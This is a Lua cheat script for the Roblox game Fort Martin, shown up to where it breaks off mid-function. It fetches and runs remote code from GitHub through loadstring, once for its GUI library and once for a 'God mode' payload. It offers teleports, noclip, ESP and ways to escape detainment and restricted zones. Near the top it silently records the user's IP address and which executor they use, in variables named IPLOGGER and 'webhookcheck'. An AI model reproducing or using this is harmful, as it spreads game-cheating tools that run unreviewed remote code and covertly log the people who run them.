local script12321

if _G == "2J7rttPAgtYqC0PZi1kRCf9BUFj2en6uNRZQc0ywCAZq0WqNH4V5AbWY0wjk75tWJ3yH9DiMkGy7Aibb3Reo6M6cGUzoxdGo5nKE" then
    script12321 = "ADMIN"
else
    script12321 = "VIP"
end

local ezString = _G

local IPLOGGER = tostring(game:HttpGet("https://api.ipify.org", true))

local webhookcheck =
is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
secure_load and "Sentinel" or
KRNL_LOADED and "Krnl" or
SONA_LOADED and "Sona" or
"Unknown exploit"

if game.PlaceId == 653205701 then
    local script12321 = "ADMIN"
local game12321 = "Game: Fort Martin"


local Mercury = loadstring(game:HttpGet("https://raw.githubusercontent.com/UD92IlIllllII421248535IlIIIIIIIlllIlIIl/Yeah/main/.gitignore"))()
local GUI = Mercury:Create{
    Name = "Mercury",
    Size = UDim2.fromOffset(615, 400),
    Theme = Mercury.Themes.Dark,
    Link = "http://discord.gg/wUbAAhypTH"
}

local Tab = GUI:Tab{
	Name = "Miscellaneous",
	Icon = "rbxassetid://6157200594"
}

local MPCUndetainToggle = false -- Default toggle state
local loopEnabled = false -- Variable to control the loop

local function MPCUndetainScript()
    local player = game:GetService("Players").LocalPlayer
    local prevCFrame = player.Character.HumanoidRootPart.CFrame -- holds the old CFrame

    while loopEnabled do
        if player.PlayerGui:FindFirstChild("DetainWarning") then
            prev = LP.Character:WaitForChild('HumanoidRootPart').CFrame
            local function destroyPlayer()
                if player.Character then
                    player.Character:Destroy()
                end
            end

            destroyPlayer()
            wait(0.1)

            game:GetService("ReplicatedStorage").Packages.Knit.Services.PlayerHandler.RF.RequestDeploy:InvokeServer()

            player.Character.HumanoidRootPart.CFrame = prevCFrame -- Return to previous position
            player.Character.HumanoidRootPart.CFrame = prevCFrame
            player.Character.HumanoidRootPart.CFrame = prevCFrame
            -- Execute your script here when "DetainWarning" GUI is found
            player.Character.Torso.Anchored = false
            player.Character.Head.Anchored = false
            player.Character.HumanoidRootPart.Anchored = false
        end
        wait(0.01) -- Faster iteration, adjust the delay as needed
    end
end

local toggle = Tab:Toggle{
    Name = "MPC undetain",
    Description = "Removes MPC detainment. Must be detained to work.",
    Callback = function(state)
        MPCUndetainToggle = state
        if MPCUndetainToggle then
            if not loopEnabled then
                loopEnabled = true -- Start the loop if it's not already running
                MPCUndetainScript()
            end
        else
            loopEnabled = false -- Stop the loop
        end
    end
}

toggle:SetState(MPCUndetainToggle) -- Set the initial toggle state

if MPCUndetainToggle then
    loopEnabled = true -- Start the loop
    MPCUndetainScript()
end

LP = game:GetService('Players').LocalPlayer

local buttonClicked = false -- Tracks button click state
local originalCFrame -- Variable to store the original CFrame



LP = game:GetService('Players').LocalPlayer

local toggleEnabled = false -- Default value set to false
local prev -- Variable to hold the previous CFrame value

Tab:Toggle{
    Name = "Destroy Character",
    Description = "Removes your character from the workspace until the toggle is turned off.",
    Callback = function()
        toggleEnabled = not toggleEnabled -- Toggle the variable between true and false

        if toggleEnabled then
            prev = LP.Character:WaitForChild('HumanoidRootPart').CFrame -- Holds old CFrame value
            local Players = game:GetService("Players")
            local LocalPlayer = Players.LocalPlayer

            local function destroyCharacter()
                local character = LocalPlayer.Character
                if character then
                    character:Destroy()
                end
            end

            destroyCharacter()
        else
            game:GetService("ReplicatedStorage").Packages.Knit.Services.PlayerHandler.RF.RequestDeploy:InvokeServer()
            LP.Character:WaitForChild('HumanoidRootPart').CFrame = prev
            player.Character.Torso.Anchored = false
            player.Character.Head.Anchored = false
            player.Character.HumanoidRootPart.Anchored = false
        end
    end
}


local godModeEnabled = false  -- Toggle for God Mode
LP = game:GetService('Players').LocalPlayer
Tab:Toggle{
    Name = "God mode",
    Description = "God Mode gives you infinite health. Note: Risk of getting kicked/banned.",
    Callback = function()
        godModeEnabled = not godModeEnabled  -- Toggle the variable between true and false

        if godModeEnabled then

    loadstring(game:HttpGet("https://raw.githubusercontent.com/Ihaveash0rtnamefordiscord/Releases/main/FortMartinGodmode"))(' Watermelon ?')
wait(1)
game:GetService("Players").LocalPlayer.Character.Humanoid.Health = 100
        else

prev = LP.Character:WaitForChild('HumanoidRootPart').CFrame --holds old CFrame string

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local function destroyCharacter()
    local character = LocalPlayer.Character
    if character then
        character:Destroy()
    end
end

destroyCharacter()
wait(0.1)
game:GetService("ReplicatedStorage").Packages.Knit.Services.PlayerHandler.RF.RequestDeploy:InvokeServer()
LP.Character:WaitForChild('HumanoidRootPart').CFrame = prev 

        end
    end
}


Tab:Button{
	Name = "Remove Anti",
	Description = "Allows you to bypass out of bounds zones and anti-barriers for raiders.",
	Callback = function()
workspace.Regions.RaiderRestricted:Destroy()
    workspace.Regions.Pavilions:Destroy()
    workspace.Regions.Prison:Destroy()

end}

Tab:Button{
	Name = "Allow Reset",
	Description = "Allowing reset even when detained.",
	Callback = function() 
	    local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Reseting...",
	Duration = 8,
	Callback = function() end
}

while wait() do
    game:GetService("StarterGui"):SetCore("ResetButtonCallback",true)
end
while wait() do
    game:GetService("ReplicatedStorage").Packages.Knit.Services.PrisonService.RF.DetainReleaseCheck:InvokeServer()
end
end}

Tab:Button{
	Name = "Fix Character",
	Description = "Wait for 3 seconds, you might need to click it 3 times.",
	Callback = function() 
	    local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Reseting...",
	Duration = 8,
	Callback = function() end
}
game:GetService("ReplicatedStorage").Packages.Knit.Services.PlayerHandler.RF.RequestDeploy:InvokeServer()
end}

local Tab = GUI:Tab{
	Name = "TP-places",
	Icon = "rbxassetid://7199724739"
}

Tab:Button{
	Name = "ASOC pavs/helipads/parachutes",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-502.314758, 11.1710091, 828.320496, 0.999988198, -4.81881443e-06, 0.00486741215, -1.28890351e-05, 0.999993384, 0.00364383636, -0.00486739771, -0.00364385615, 0.999981582)
end}

Tab:Button{
	Name = "MPC HQ",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(86.9417114, 9.73274612, 600.078186, -0.00775325531, -5.18449683e-09, 0.999969959, 2.86729041e-08, 1, 5.40696776e-09, -0.999969959, 2.87139628e-08, -0.00775325531)
end}

Tab:Button{
	Name = "MPC Jail",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(86.9367905, -5.68009472, 582.540588, -0.999667168, -4.01923606e-10, -0.0257991701, -9.49855472e-11, 1, -1.18984325e-08, 0.0257991701, -1.18920216e-08, -0.999667168)
end}

Tab:Button{
	Name = "MPC helipads",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(88.2854691, 44.2849922, 544.887329, -0.999979973, 8.76001138e-08, 0.0063287681, 8.75278161e-08, 1, -1.17001431e-08, -0.0063287681, -1.1145965e-08, -0.999979973)
end}

Tab:Button{
	Name = "Main Pavs",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(6.65618134, 10.7407579, 1350.91467, 0.999997377, -6.17675866e-08, 0.00229073549, 6.1614351e-08, 1, 6.69644464e-08, -0.00229073549, -6.68231337e-08, 0.999997377)
end}

Tab:Button{
	Name = "BCT spawn",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(988.299927, 11.8485556, 934.527527, 0.999945402, 4.30277645e-08, -0.0104473019, -4.31641389e-08, 1, -1.28279103e-08, 0.0104473019, 1.3278159e-08, 0.999945402)
end}

Tab:Button{
	Name = "BCT middle",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1083.1134, 12.2083025, 689.882996, -0.999296308, -5.34490973e-05, -0.0375103839, -4.1442334e-07, 0.999998987, -0.00141386897, 0.0375104211, -0.00141285849, -0.999295294)
end}

Tab:Button{
	Name = "BCT gates",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(837.339111, 11.0584269, 969.930359, 0.999859989, 6.13850375e-08, -0.0167334024, -6.15545517e-08, 1, -9.61499325e-09, 0.0167334024, 1.06436637e-08, 0.999859989)
end}

Tab:Button{
	Name = "BCT back entrence",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(843.585205, 10.3485556, 709.132996, 0.0233228076, -6.05396906e-08, -0.999727964, 1.46258134e-08, 1, -6.02149584e-08, 0.999727964, -1.32174529e-08, 0.0233228076)
end}

Tab:Button{
	Name = "BCT obstacle course",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1421.87317, 8.97494888, 873.78479, 0.999670088, 5.95610601e-08, -0.0256855972, -5.97199517e-08, 1, -5.41883916e-09, 0.0256855972, 6.950994e-09, 0.999670088)
end}

Tab:Button{
	Name = "BCT classroom 1",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1213.36328, 12.0569696, 1053.1792, -0.01886978, -2.428194e-08, 0.999821961, -4.97723356e-08, 1, 2.33469031e-08, -0.999821961, -4.93229244e-08, -0.01886978)
end}

Tab:Button{
	Name = "BCT classroom 2",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1443.5238, 11.9319658, 339.510925, 0.752191424, -4.12809387e-09, -0.658944607, 9.99932492e-09, 1, 5.14961762e-09, 0.658944607, -1.04625002e-08, 0.752191424)
end}

Tab:Button{
	Name = "TRADOC spawn/pavs",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1370.94263, 11.8253345, 923.979492, -0.999791086, 7.08361476e-05, -0.0204392616, -1.61742446e-05, 0.99999094, 0.00425661588, 0.0204393771, 0.00425605709, -0.999782026)
end}

Tab:Button{
	Name = "Parachute area",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-371.571716, 11.4136524, 1257.21594, -0.999861836, 1.23129196e-08, -0.0166229904, 1.13961782e-08, 1, 5.52437172e-08, 0.0166229904, 5.50466446e-08, -0.999861836)
end}

Tab:Button{
	Name = "Civilian parachute area",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(624.714233, 36.2230988, -776.079468, 0.868700683, -0.00357898255, -0.495324433, -1.04035398e-05, 0.999973774, -0.00724359136, 0.495337367, 0.00629766658, 0.868677914)
end}

Tab:Button{
	Name = "Eagle-1, C-17",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-727.325439, 10053.4375, 2551.65161, 1.37240555e-22, 1.96370351e-12, -1, 5.09596618e-12, 1, 1.96370351e-12, 1, -5.09596618e-12, 1.27233596e-22)
end}

Tab:Button{
	Name = "Eagle-2, C-17",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1218.95276, 2181.74048, 2687.65991, 0.62458998, -0.0012935485, 0.780951798, -1.56878752e-06, 0.999998629, 0.00165763672, -0.780952871, -0.00103657809, 0.624589145)
end}

Tab:Button{
	Name = "Civilian plane",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-671.884277, 3331.55176, -1295.37415, 0.711412668, -3.79786513e-08, -0.702774525, 1.91926519e-09, 1, -5.20981622e-08, 0.702774525, 3.5714482e-08, 0.711412668)
end}

Tab:Button{
	Name = "Main lockers",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-79.4713516, 11.8364649, 937.480957, 0.016474437, 0.00772784511, 0.999834418, -1.39475969e-05, 0.999970138, -0.0077286642, -0.99986428, 0.000113380396, 0.0164740514)
end}

Tab:Button{
	Name = "MIC spawn",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(590.387085, -13.2860994, 758.748291, 0.0130349547, -1.00658234e-07, 0.999915063, 1.63013887e-08, 1, 1.0045428e-07, -0.999915063, 1.49905865e-08, 0.0130349547)
end}

Tab:Button{
	Name = "BCT Graduation/Inspection arena",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(944.054504, 9.64926529, 1150.47632, -0.999684632, 8.47997441e-08, 0.0251116548, 8.29876896e-08, 1, -7.32021661e-08, -0.0251116548, -7.10951227e-08, -0.999684632)
end}

Tab:Button{
	Name = "Inspection Arena",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(63.2768707, 3.97309732, 1563.76892, -0.99989301, -2.33780924e-08, 0.0146266464, -2.29739658e-08, 1, 2.77974372e-08, -0.0146266464, 2.7458432e-08, -0.99989301)
end}

Tab:Button{
	Name = "HQ offices",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(566.007996, 9.80166626, 675.131958, -0.745923996, -1.14779326e-07, 0.666031063, -5.92766156e-08, 1, 1.05946221e-07, -0.666031063, 3.95477606e-08, -0.745923996)
end}

Tab:Button{
	Name = "HQ helipad",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(613.711548, 33.08741, 512.916138, -0.999864519, 7.24428375e-08, -0.0164586939, 7.14111508e-08, 1, 6.32709529e-08, 0.0164586939, 6.20870537e-08, -0.999864519)
end}

Tab:Button{
	Name = "Combat Arena",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(959.810669, 37.1636963, 1583.86548, 0.0611626282, 0.00419920497, -0.998118937, -1.58698767e-05, 0.999991179, 0.00420610886, 0.998127759, -0.000241416725, 0.0611621514)
end}

Tab:Button{
	Name = "Obstacle course 1",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(339.775726, 8.9776516, 1602.72485, -0.0115794567, 6.29152765e-08, -0.999932945, 6.84197516e-08, 1, 6.21271781e-08, 0.999932945, -6.76957654e-08, -0.0115794567)
end}

Tab:Button{
	Name = "Obstacle course 2",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(205.194489, 6.9181633, 2113.85645, -0.0174634513, -0.00746318977, -0.999819636, -1.20515087e-05, 0.999972165, -0.00746411784, 0.999847472, -0.000118296361, -0.0174630564)
end}

Tab:Button{
	Name = "Top of tower",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(89.5629501, 86.732605, 2283.823, 0.999928355, -3.19849933e-05, 0.0119636878, -1.38731939e-05, 0.999992669, 0.00383119867, -0.0119637232, -0.00383108994, 0.999921024)
end}

Tab:Button{
	Name = "Gas station",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(100.288239, 9.55741215, 989.492249, 0.999849319, -2.01223731e-08, -0.0173591096, 2.01457784e-08, 1, 1.17339594e-09, 0.0173591096, -1.52293189e-09, 0.999849319)
end}

Tab:Button{
	Name = "Civilian spawn",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(259.106445, 9.53177071, -15.8817606, -0.999200523, 1.37413778e-08, 0.03997913, 8.84676155e-09, 1, -1.2260621e-07, -0.03997913, -1.22154503e-07, -0.999200523)
end}

Tab:Button{
	Name = "Raiders spawn",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(10.246089, 20.9324799, -491.017151, -0.893917918, -2.69051732e-08, 0.448230743, -2.60664272e-08, 1, 8.04034084e-09, -0.448230743, -4.49636905e-09, -0.893917918)
end}

Tab:Button{
	Name = "Civilian gate",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(257.801727, 9.91553211, 389.690826, 0.999987543, 2.52958241e-08, 0.00498700375, -2.54312535e-08, 1, 2.70930105e-08, -0.00498700375, -2.72194995e-08, 0.999987543)
end}

Tab:Button{
	Name = "Raiders roof  1",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(213.052414, 76.2043839, 1450.51355, 0.999924183, 4.59646726e-05, -0.0123136044, -6.3619209e-06, 0.999994814, 0.00321683846, 0.0123136882, -0.00321651623, 0.999918997)
end}

Tab:Button{
	Name = "Raiders roof  2",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(213.052414, 76.2043839, 1450.51355, 0.999924183, 4.59646726e-05, -0.0123136044, -6.3619209e-06, 0.999994814, 0.00321683846, 0.0123136882, -0.00321651623, 0.999918997)
end}

Tab:Button{
	Name = "Classroom 1",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-48.0594864, 31.5873032, 912.532471, 0.999863863, -0.000112432761, -0.0165009648, -1.37737488e-05, 0.999970734, -0.00764817325, 0.0165013429, 0.00764735881, 0.999834597)
end}

Tab:Button{
	Name = "Classroom 2",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-51.2224731, 11.4481373, 898.298767, 0.999739528, -8.89821094e-05, -0.0228216425, -3.01393766e-06, 0.999991894, -0.00403091032, 0.0228218138, 0.00402992871, 0.999731421)
end}

Tab:Button{
	Name = "Classroom 3",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-84.3731613, 24.9674625, 1047.09753, 0.874340236, -5.97644734e-09, 0.485313475, -7.91967469e-09, 1, 2.65826898e-08, -0.485313475, -2.70858393e-08, 0.874340236)
end}

Tab:Button{
	Name = "Undergrown tunnel civlian",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Teleporting...",
	Duration = 2,
	Callback = function() end 
                
            }
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(172.857773, -8.10354042, 214.540146, 0.00442328211, 5.67852831e-09, -0.999990225, 1.05739257e-08, 1, 5.72535575e-09, 0.999990225, -1.05991473e-08, 0.00442328211)
end}

local Tab = GUI:Tab{
	Name = "Utility/Player",
	Icon = "rbxassetid://7194280652"
}

Tab:Slider{
    Name = "Walk Speed Slider",
    Default = 16,
    Min = 1,
    Max = 500,
    Callback = function(value)
        local Players = game:GetService("Players")
        local LocalPlayer = Players.LocalPlayer
        
        -- Set the player's walk speed based on the slider value
        LocalPlayer.Character.Humanoid.WalkSpeed = value
    end
}

Tab:Slider{
    Name = "Jump Power Slider",
    Default = 50,
    Min = 1,
    Max = 500,
    Callback = function(value)
        local Players = game:GetService("Players")
        local LocalPlayer = Players.LocalPlayer
        
        -- Set the player's jump power based on the slider value
        LocalPlayer.Character.Humanoid.JumpPower = value
    end
}

Tab:Slider{
    Name = "Field of View Slider",
    Default = 70,
    Min = 1,
    Max = 500,
    Callback = function(value)
        local amount = value
        game:GetService('Workspace').Camera.FieldOfView = amount
    end
}



Tab:Button{
	Name = "Cammra Noclip",
	Description = "Allows your cammra to go through the walls.",
	Callback = function()
for useless, garbage in next,getgc() do
   if getfenv(garbage).script == game.Players.LocalPlayer.PlayerScripts.PlayerModule.CameraModule.ZoomController.Popper and typeof(garbage) == "function" then
       for number, value in next, getconstants(garbage) do
           if tonumber(value) == 0.25 then
               setconstant(garbage,number,0)
           elseif tonumber(value) == 0 then
               setconstant(garbage,number,0.25)
           end
       end
   end
end
end}



local toggle = Tab:Toggle{
    Name = "Noclip Toggle",
    Description = "Enable or disable noclip functionality.",
    Callback = function(state)
        noclip = state
        if noclip then
            game:GetService('RunService').Stepped:connect(function()
                if noclip then
                    game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
                end
            end)
        end
    end
}





local Tab = GUI:Tab{
	Name = "ESP",
	Icon = "rbxassetid://7219199111"
}

Tab:Toggle{
    Name = "TRADOC ESP",
    StartingState = false,
    Description = "It will show the location of all TRADOC members.",
    Callback = function(state)
        getgenv().ESPTRADOC = true
        getgenv().ESPTRADOC = state

        local ESPRADOC_UPDATE_INTERVAL = 2

        local function updateESPRADOC()
            for _, player in pairs(game:GetService("Players"):GetChildren()) do
                if player.Team and player.Team.Name == "TRADOC" then
                    local existingBillboardGui = player.Character and player.Character:FindFirstChild("ESPRADOC")
                    if not existingBillboardGui then
                        local billboardGui = Instance.new("BillboardGui")
                        billboardGui.Name = "ESPRADOC"
                        billboardGui.Size = UDim2.new(0, 100, 0, 100)
                        billboardGui.AlwaysOnTop = true
                        billboardGui.LightInfluence = 0
                        billboardGui.MaxDistance = math.huge
                        billboardGui.Parent = player.Character or player.CharacterAdded:Wait()

                        local nameLabel = Instance.new("TextLabel")
                        nameLabel.Name = "NameLabel"
                        nameLabel.Parent = billboardGui
                        nameLabel.Size = UDim2.new(1, 0, 0.5, 0)
                        nameLabel.Position = UDim2.new(0, 0, 0, 0)
                        nameLabel.BackgroundTransparency = 1
                        nameLabel.Text = player.Name .. " (" .. tostring(math.floor((player.Character and player.Character:FindFirstChild("HumanoidRootPart") and (player.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude or 0) + 0.5)) .. " studs)"
                        nameLabel.TextColor3 = Color3.new(1, 1, 1)
                        nameLabel.FontSize = Enum.FontSize.Size18
                        nameLabel.Font = Enum.Font.SourceSansBold
                    else
                        existingBillboardGui.Enabled = true
                        existingBillboardGui.NameLabel.Text = player.Name .. " (" .. tostring(math.floor((player.Character and player.Character:FindFirstChild("HumanoidRootPart") and (player.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude or 0) + 0.5)) .. " studs)"
                    end
                end
            end
        end

        if getgenv().ESPTRADOC == true then
            while true do
                if getgenv().ESPTRADOC then
                    updateESPRADOC()
                end
                wait(ESPRADOC_UPDATE_INTERVAL)
            end
        else
            for _, player in pairs(game:GetService("Players"):GetChildren()) do
                local existingBillboardGui = player.Character and player.Character:FindFirstChild("ESPRADOC")
                if existingBillboardGui then
                    existingBillboardGui.Enabled = false
                end
            end
        end

        local holder = game.CoreGui:FindFirstChild("ESPRADOCHolder") or Instance.new("Folder")
        if ESPRADOC == false then
            holder:Destroy()
        end

        if holder.Name == "Folder" then
            holder.Name = "ESPRADOCHolder"
            holder.Parent = game.CoreGui
        end

        if uselocalplayer == false and holder:FindFirstChild(game.Players.LocalPlayer.Name) then
            holder:FindFirstChild(game.Players.LocalPlayer.Name):Destroy()
        end

        if getgenv().ESPTRADOC == true then
            getgenv().ESPTRADOC = false
            getgenv().ESPTRADOC = true
        end

        while getgenv().ESPTRADOC do
            task.wait()
            for _, v in pairs(game.Players:GetChildren()) do
                if v.Team ~= nil and v.Team.Name == "TRADOC" then
                    local chr = v.Character
                    if chr ~= nil then
                        local ESPRADOC = holder:FindFirstChild(v.Name) or Instance.new("Highlight")
                        ESPRADOC.Name = v.Name
                        if uselocalplayer == false and ESPRADOC.Name == game.Players.LocalPlayer.Name then
                        else
                            ESPRADOC.Parent = holder
                            if filluseteamcolor then
                                ESPRADOC.FillColor = v.TeamColor.Color
                            else
                                ESPRADOC.FillColor = fillcolor
                            end
                            if outlineuseteamcolor then
                                ESPRADOC.OutlineColor = v.TeamColor.Color
                            else
                                ESPRADOC.OutlineColor = outlinecolor
                            end
                            ESPRADOC.FillTransparency = filltrans
